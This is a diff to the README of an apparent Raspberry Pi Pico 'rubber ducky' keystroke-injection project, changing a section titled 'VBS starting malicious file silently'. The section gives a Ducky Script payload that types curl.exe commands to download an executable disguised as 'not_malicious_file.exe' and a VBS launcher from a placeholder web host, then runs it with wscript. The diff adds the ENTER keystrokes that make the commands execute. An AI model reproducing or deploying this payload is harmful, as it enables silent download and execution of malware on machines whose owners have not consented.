@@ -42,7 +42,7 @@ Remove the jumper and reconnect to your PC to reprogram. The default mode is USB
 
 ![usb-boot-mode](https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/images/usb-boot-mode.png)
 
-# VBS starting malicious file silently
+# VBS silently starting malicious file 
 
 For Windows, if you want to silently run `.exe` files you can run them with VBS. Your `payload.dd` should looks like this :
 
@@ -51,7 +51,10 @@ STRING curl.exe --output not_malicious_file.exe --url https://youwebsite.example
 ENTER
 DELAY 1000
 STRING curl.exe --output starter.vbs --url https://youwebsite.example/ressources/starter.vbs
+ENTER
+DELAY 1000
 STRING wscript starter.vbs
+ENTER
 ```
 This will download `not_malicious_file.exe` and `starter.vbs`. The `starter.vbs` looks like this :
 
